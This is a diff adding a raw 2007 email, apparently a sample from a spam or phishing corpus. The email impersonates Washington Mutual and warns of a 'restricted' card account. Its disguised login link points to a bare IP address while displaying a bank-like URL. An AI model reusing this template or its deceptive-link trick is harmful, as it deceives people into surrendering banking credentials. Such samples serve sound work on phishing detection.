@@ -1,0 +1,58 @@
+Return-Path: <root@localhost.localdomain>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 835E446904
+	for <user@login.example.com>; Sun,  6 May 2007 06:46:18 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 7B81C131FA78
+	for <user@example.com>; Sun,  6 May 2007 06:46:18 -0400 (EDT)
+Received: from localhost.localdomain (unknown [219.232.117.250])
+	by mail.example.org (Postfix) with ESMTP id 0D84A6FA1C1
+	for <user@example.com>; Sun,  6 May 2007 06:46:17 -0400 (EDT)
+Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
+	by localhost.localdomain (8.13.8/8.13.8) with ESMTP id l46Ij65Q025263
+	for <user@example.com>; Mon, 7 May 2007 02:45:11 +0800
+Received: (from root@localhost)
+	by localhost.localdomain (8.13.8/8.13.8/Submit) id l46Ij5q0025261;
+	Mon, 7 May 2007 02:45:05 +0800
+Date: Mon, 7 May 2007 02:45:05 +0800
+Message-Id: <200705061845.l46Ij5q0025261@localhost.localdomain>
+To: user@example.com
+Subject: WaMu Communication Ref-380875540
+From: WaMu <wamu@email-wamucards.com>
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 1220
+
+
+<a href="http://email.wamu.com/a/hBF1hDVANZDnZA9cEnAA8yy55zi/login" target="_blank" rel="nofollow">
+<img alt="Washington Mutual" src="http://f.chtah.com/i/23/224672217/w701_sb_pre_email_012207_03.gif" border="0" width="185" height="55"></a><p><B>
+<font size="2">Dear Valued Customer,<BR><BR>Washington Mutual  is constantly working to increase
+security for all Online Banking users. <BR>To ensure the integrity of our online
+payment system, we periodically review accounts.<BR><BR>Your card account might be
+placed on restricted status due to numerous invalid login <BR>attempts into your card 
+acccont. Restricted card accounts continue to receive payments, <BR>but they are
+limited in their ability to send or withdraw funds. To continue<BR>to the
+verification process and ensure your card account security. <BR>It is all about your
+security. </font></B></p>
+<p><B><font size="2"> <BR>Please remember to visit the customer service
+section. <BR>To initiate the update confirmation process,<BR>You are now
+required to Login to </font></B>
+<a href="http://218.211.211.103/www.wamucards.com/Online%20Account/Updates/">
+https://wamucards/....updates.com/Notification</a></p>
+<p><b><font size="2">Thank you for choosing Washington Mutual (R).<br>
+<br>
+Customer Service<br>
+<br>
+PS: Control your credit with free FICO® credit scores, E-mail Alerts, <br>
+and Automatic Monthly Payments for your card account.<br>
+<br>
+<br>
+<br>
+<-Communication Ref-380875540-></font></b></p>
+
+email  :wamu@email.wamucards.com
+
